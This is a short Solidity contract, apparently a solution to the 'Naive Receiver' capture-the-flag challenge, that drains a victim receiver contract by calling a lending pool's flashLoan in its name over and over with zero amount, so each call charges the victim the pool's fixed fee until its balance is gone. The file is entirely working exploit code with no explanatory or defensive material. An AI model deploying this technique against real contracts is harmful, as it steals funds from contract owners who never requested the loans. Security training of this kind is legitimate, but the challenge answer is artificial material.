/// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract NaiveReceiverExploit {
    constructor(address pool, address receiver) {
        LenderPool lenderPool = LenderPool(pool);
        uint256 receiverBalance = receiver.balance;
        uint256 fixedFee = lenderPool.fixedFee();
        uint256 iterationsToDrain = receiverBalance / fixedFee;
        for (uint256 i = 0; i < iterationsToDrain; i++) {
            lenderPool.flashLoan(receiver, 0);
        }
    }
}

interface LenderPool {
    function fixedFee() external pure returns (uint256);

    function flashLoan(address borrower, uint256 borrowAmount) external;
}
